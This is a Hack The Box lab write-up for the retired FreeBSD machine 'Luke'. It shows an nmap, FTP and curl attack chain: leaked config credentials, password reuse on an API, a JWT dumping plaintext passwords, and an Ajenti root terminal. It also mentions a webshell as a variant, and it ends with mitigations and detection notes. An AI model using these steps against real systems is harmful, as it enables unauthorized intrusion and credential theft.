---
machine: Luke
os: FreeBSD
difficulty: Medium
platform: Hack The Box
category: Web / FreeBSD
state: Retired
tags: [freebsd, ftp, php, api, jwt, ajenti, credentials]
---

# Luke — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology note; no real flags or credentials.

## TL;DR

Anonymous FTP with a webapp's source, an Apache serving `config.php` as plain text because PHP is not executed there, a Node API on 3000 and the Ajenti panel on 8000. The MySQL password is reused as the API `admin` password; its JWT lists users and their plaintext passwords, and `Derry`'s opens the `/management` basic auth. That directory exposes `config.json` with Ajenti's `root` password, and Ajenti runs as root: its terminal is the escalation.

## Recon

```bash
nmap -p- --min-rate 5000 -oA nmap_all <IP>
nmap -p 21,22,80,3000,8000 -sCV -oA nmap_svc <IP>
```

```text
21/tcp   open  ftp     vsftpd 3.0.3+ (anonymous allowed)
22/tcp   open  ssh     (banner not identified)
80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
3000/tcp open  http    Node.js Express framework
8000/tcp open  http    Ajenti http control panel
```

- Anonymous FTP publishes `webapp/` with the source and a note signed by "Derry" mentioning Chihiro.
- The API on 3000 answers JSON and has its own login.
- Ajenti is an administration panel; port 8000 decides the escalation.

```bash
printf '%s\n' '<IP> luke.htb' | sudo tee -a /etc/hosts
```

## Enumeration

```bash
ftp -a <IP>              # anonymous
ftp> ls webapp
ftp> get webapp/for_Chihiro.txt
```

The note hints that the site's source is on the FTP and the web references it. An extension-aware sweep finds `/config.php`, `/login.php`, `/member` and `/management`.

`/config.php` is served as plain text: Apache has PHP, but that file is not executed in that context, so the source with the database credentials downloads as-is.

```text
$dbUsername = 'root';
$dbPassword = '<PASSWORD>';
$db = "login";
```

## Foothold

The MySQL password is reused as the API `admin` password:

```bash
curl -s -X POST http://luke.htb:3000/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"<PASSWORD>"}'
```

It returns a JWT. With it the accounts are enumerated and the API hands over plaintext passwords:

```bash
curl -s http://luke.htb:3000/users -H 'Authorization: <JWT>'
curl -s http://luke.htb:3000/users/Derry -H 'Authorization: <JWT>'
```

```text
Derry · Web Admin · <PASSWORD>
```

`Derry` is the account that opens the `/management` basic auth:

```bash
curl -s -u 'Derry:<PASSWORD>' http://luke.htb:8000/management/
```

## Lateral movement

There is no second host. Movement goes from the API (application user) to the administration panel on the same server, and from there to root.

## Privilege escalation

Inside `/management` sits Ajenti's configuration, `config.json`, with the panel's `root` password:

```bash
curl -s -u 'Derry:<PASSWORD>' http://luke.htb:8000/management/config.json
```

Ajenti runs as root and its terminal does not drop privileges:

```text
user: root
password: <PASSWORD>
```

Opening `Tools → Terminal → New` gives a root session:

```bash
id
# uid=0(root) gid=0(wheel)
```

The equivalent variant uses the panel's file manager to drop a PHP webshell in `/usr/local/www/apache24` and run it from the web; the outcome is the same because the panel process is root.

## Evidence

- `ls` of the anonymous FTP with `webapp/` and the note.
- Downloaded `config.php` with the password redacted.
- `GET /users` with the JWT and `Derry`'s password redacted.
- `config.json` with root's password truncated.
- `id` as root in the Ajenti terminal.

## Lessons learned

- A `.php` served by Apache with PHP does not always execute: it depends on the directory's `AddType`/handler, and the source can leak.
- Reusing the database password on the panel and the API multiplies the impact of a single leak.
- An API returning plaintext passwords turns a user JWT into a credential dump.
- Administration panels running as root need no exploit: the feature is the escalation.
- Anonymous FTP is not just a share: here it was the code repository.

## Mitigations and detection

- Disable anonymous FTP and stop publishing source; make sure `.php` files with secrets either execute or leave the web tree.
- Use distinct credentials per service and store hashes, never reversible passwords.
- Never return passwords from an API; limit `GET /users` to minimal data and audit access.
- Protect `/management` with strong authentication and run Ajenti as an unprivileged user.
- Detection: downloads of `config.php`/`config.json` in the access log; anonymous FTP logins; `POST /login` followed by `/users` sweeps; port 8000 access from the same IP; Ajenti child processes with `uid=0`.

MITRE: T1552.001, T1078, T1550.001, T1087, T1059.004.

## References

- <https://0xdf.gitlab.io/2019/09/14/htb-luke.html>
- <https://jebidiah-anthony.github.io/boxes/28_Luke.html>
- <https://godiego.co/posts/Luke>
- <https://attack.mitre.org/techniques/T1552/001/>
